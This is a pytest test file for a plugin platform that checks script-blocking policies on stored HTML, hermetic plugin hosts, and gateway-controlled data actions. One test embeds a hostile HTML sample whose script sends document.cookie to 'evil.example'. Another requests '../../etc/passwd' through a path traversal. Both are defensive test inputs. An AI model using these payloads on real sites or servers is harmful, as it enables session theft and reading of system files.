"""What extracting the Amazon PPC Factory needed from core (build step 8).

A plugin's seats get its playbook as skills and three generic tools
(`plugin_describe`, `plugin_file`, `plugin_action`); its HTML pages are stored
under a policy that runs no script; and its host imports nothing the server's
Python happens to have installed. Each is attacked here over the agent API
or against a real host. The PPC plugin itself is tested in its own repo, by
its own tests and the conformance suite.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest
from sqlalchemy import select
from yaaf_plugin_api import Brief, HookKey, Page, ProjectSnapshot
from yaaf_plugin_api import hooks as api_hooks

from tests.conftest import ADMIN, bearer, live_token, make_project, seed_role
from yaaf.core import ids
from yaaf.core.config import settings
from yaaf.core.db import db_session
from yaaf.core.models import Artifact, DataSourceTool, PluginArtifact, Project, ToolPermission
from yaaf.plugins import host as H
from yaaf.plugins import primitives, registry

ROOT = Path(__file__).resolve().parents[2]
EXAMPLE = ROOT / "packages/yaaf_plugin_api/examples/grant-factory"


@pytest.fixture
def grant(client, tmp_path, monkeypatch):
    monkeypatch.setattr(settings(), "plugins_root", str(tmp_path / "installed"))
    monkeypatch.setattr(settings(), "allow_local_plugins", True)
    src = tmp_path / "checkout"
    shutil.copytree(EXAMPLE, src, ignore=shutil.ignore_patterns("__pycache__"))
    assert client.post("/admin/plugins/local", json={"path": str(src)},
                       headers=ADMIN).json()["status"] == "ready"
    seed_role(client, "grant-lead", is_ceo=True)
    project = make_project(client, slug="garden", kind="plugin:grant_application",
                           ceo_role_slug="grant-lead", kind_fields={"funder": "F"})
    seat = project["teams"][0]["agents"][0]["id"]
    yield {"project": project, "token": bearer(live_token(project["id"], seat)[1])}
    registry.close_all()


# ── HTML pages ─────────────────────────────────────────────────────────────────


def test_an_html_page_is_stored_under_a_policy_that_runs_no_script(client, grant):
    hostile = (b"<!DOCTYPE html><html><head><meta http-equiv='Content-Security-Policy' "
               b"content=\"script-src *\"><script>fetch('https://evil.example/'+document"
               b".cookie)</script></head><body onload=alert(1)>hi</body></html>")
    with db_session() as s:
        row = primitives.store_platform(s, s.get(Project, grant["project"]["id"]), None,
                                        "deck.html", hostile, role="page",
                                        media_type="text/html")
        from yaaf.core.artifacts import store

        stored = store().get_bytes(row.storage_key)
    head, _, rest = stored.partition(b"<html>")
    assert head.startswith(b"<!DOCTYPE html>")
    assert primitives.PAGE_CSP.encode() in head and b"<script>" not in head
    assert b"default-src 'none'" in head and b"form-action 'none'" in head
    # The plugin's own looser policy comes after, and a browser enforces both.
    assert rest.index(b"script-src *") > 0


def test_the_api_allows_html_pages_and_still_refuses_svg_and_script():
    key = HookKey("render")
    ok = [Page("a.html", "text/html", b"<p>x</p>")]
    assert api_hooks.check_return(key, ok) == []
    for media in ("image/svg+xml", "application/javascript", "text/javascript"):
        assert api_hooks.check_return(key, [Page("a.x", media, b"x")])


# ── a hermetic host ────────────────────────────────────────────────────────────


def test_a_host_imports_nothing_the_servers_python_has_installed(tmp_path):
    """sqlalchemy is installed for the server; a plugin did not declare it, so
    its host cannot import it. The standard library still works."""
    from tests.selftest_invariants.test_plugin_host import make_plugin

    spec = make_plugin(tmp_path, """
        @hook.brief
        def brief(self, ctx):
            import json as stdlib_ok
            try:
                import sqlalchemy
                return Brief("server package visible: " + sqlalchemy.__version__)
            except ImportError:
                return Brief("hermetic " + stdlib_ok.dumps([1]))
    """)
    pool = H.HostPool(spec, H.SubprocessLauncher())
    try:
        ctx = ProjectSnapshot("p", "evil_kind", "run", "0" * 40,
                              __import__("datetime").date(2027, 1, 1))
        assert pool.call(HookKey("brief"), [ctx]) == Brief("hermetic [1]")
    finally:
        pool.close()


# ── skills ─────────────────────────────────────────────────────────────────────


def test_every_seat_of_a_plugin_project_gets_its_playbook_and_a_role_skill_wins(client, grant):
    from yaaf.runner.daemon import _offer_plugin_skills

    class Job:
        tool_permissions = {"skills": [{"name": "grant-runbook", "description": "the role's",
                                        "body": "the role's own"}], "files": True}

    job = Job()
    with db_session() as s:
        _offer_plugin_skills(s, s.get(Project, grant["project"]["id"]), job)
        skills = job.tool_permissions["skills"]
        assert [x["body"] for x in skills if x["name"] == "grant-runbook"] == ["the role's own"]
        plain = make_project(client, slug="plain")
        other = Job()
        _offer_plugin_skills(s, s.get(Project, plain["id"]), other)
        assert other.tool_permissions["skills"] == Job.tool_permissions["skills"]

    fresh = type("Fresh", (), {"tool_permissions": {}})()
    with db_session() as s:
        _offer_plugin_skills(s, s.get(Project, grant["project"]["id"]), fresh)
    [skill] = fresh.tool_permissions["skills"]
    assert skill["name"] == "grant-runbook" and "Every budget line cites" in skill["body"]


# ── the seat tools ─────────────────────────────────────────────────────────────


def test_a_seat_reads_what_its_plugin_is_and_its_declared_files(client, grant):
    d = client.get("/agent/plugin/describe", headers=grant["token"]).json()
    assert d["kind"] == "plugin:grant_application" and d["files"] == ["budget"]
    assert d["review"]["of"] == "application.json"
    assert "application.md" in d["platform_writes"] and "calls.json" in d["platform_writes"]
    f = client.get("/agent/plugin/file/budget", headers=grant["token"]).json()
    assert f["filename"] == "budget.py" and f["source"] == (
        EXAMPLE / "src/grant_factory/budget.py").read_text()
    assert client.get("/agent/plugin/file/../../etc/passwd", headers=grant["token"]
                      ).status_code in (404, 422)
    assert client.get("/agent/plugin/file/nope", headers=grant["token"]).status_code == 404


def test_a_project_that_is_not_a_plugins_has_no_plugin_tools(client, grant):
    plain = make_project(client, slug="plain")
    token = bearer(live_token(plain["id"], plain["teams"][0]["agents"][0]["id"])[1])
    for method, url in (("get", "/agent/plugin/describe"), ("get", "/agent/plugin/file/x"),
                        ("post", "/agent/plugin/action/x")):
        r = getattr(client, method)(url, headers=token, **({"json": {}} if method == "post"
                                                            else {}))
        assert r.status_code == 422 and "not a factory plugin's" in r.text


def _allow(project_id: str, tool: str, source: str = "grants-db") -> None:
    with db_session() as s:
        s.add(DataSourceTool(id=ids.new_id("dst"), project_id=project_id, source=source,
                             name=tool, description="", kind="read", kind_reason="test",
                             permission=ToolPermission.ALLOW, decided_by="platform"))


def test_a_data_action_reaches_the_source_only_through_the_gateway(client, grant, monkeypatch):
    from yaaf.server import datasource_tools as gw

    pid = grant["project"]["id"]
    seen = []

    def decide(session, project, agent, source, tool):
        seen.append(("decide", source, tool, agent.id))
        return gw.Decision({"name": source}, None)

    def forward(session, project, agent, decision, arguments, run_id):
        seen.append(("forward", decision.entry["name"], run_id is not None))
        return {"structuredContent": {"funder": "Example Foundation", "max_award": 25000}}

    monkeypatch.setattr(gw, "decide", decide)
    monkeypatch.setattr(gw, "forward", forward)
    # Not yet allowed: the action is told, and says so; nothing is forwarded.
    r = client.post("/agent/plugin/action/call_for_proposals", headers=grant["token"], json={})
    assert r.status_code == 200 and r.json()["summary"]["read"] is False
    assert "no connected source offers get_call" in r.json()["summary"]["why"]
    assert seen == []
    _allow(pid, "get_call")
    r = client.post("/agent/plugin/action/call_for_proposals", headers=grant["token"], json={})
    assert r.status_code == 200 and r.json()["summary"] == {"read": True, "bytes": 52}
    assert seen[0][:3] == ("decide", "grants-db", "get_call") and seen[1][0] == "forward"
    with db_session() as s:
        row = s.execute(select(Artifact).where(Artifact.project_id == pid,
                                               Artifact.name == "calls.json")).scalars().one()
        assert row.published_by_agent_id is None
        assert s.get(PluginArtifact, row.id).role == "output"
    assert client.post("/agent/plugin/action/nope", headers=grant["token"],
                       json={}).status_code == 404


def test_a_refusal_at_the_gateway_reaches_the_action_as_a_tool_error(client, grant,
                                                                     monkeypatch):
    from yaaf.server import datasource_tools as gw
    from yaaf.server.policy import Refusal

    _allow(grant["project"]["id"], "get_call")

    def decide(*a, **k):
        raise Refusal("Data source 'grants-db' is not given to your role.", status_code=403)

    monkeypatch.setattr(gw, "decide", decide)
    r = client.post("/agent/plugin/action/call_for_proposals", headers=grant["token"], json={})
    assert r.status_code == 200
    assert r.json()["summary"] == {"read": False,
                                   "why": "Data source 'grants-db' is not given to your role."}


def test_an_action_whose_plugin_cannot_be_asked_fails_closed(client, grant, monkeypatch):
    dead = H.HostPool(H.HostSpec.from_checkout(EXAMPLE),
                      H.BrokerLauncher(("127.0.0.1", 1), b"k" * 32))
    monkeypatch.setattr(registry, "pool_for", lambda version: dead)
    r = client.post("/agent/plugin/action/call_for_proposals", headers=grant["token"], json={})
    assert r.status_code == 502 and "could not be consulted" in r.text
    with db_session() as s:
        assert s.execute(select(Artifact).where(Artifact.name == "calls.json")
                         ).scalars().first() is None


def test_the_seat_tools_are_in_the_sandbox_tool_list():
    text = (ROOT / "yaaf/runner/sandbox_entry.py").read_text()
    for name in ("plugin_describe", "plugin_file", "plugin_action"):
        assert f'@tool("{name}"' in text or f'@tool(\n    "{name}"' in text
        assert f"t_{name}," in text
    assert json.loads(json.dumps({"ok": True}))
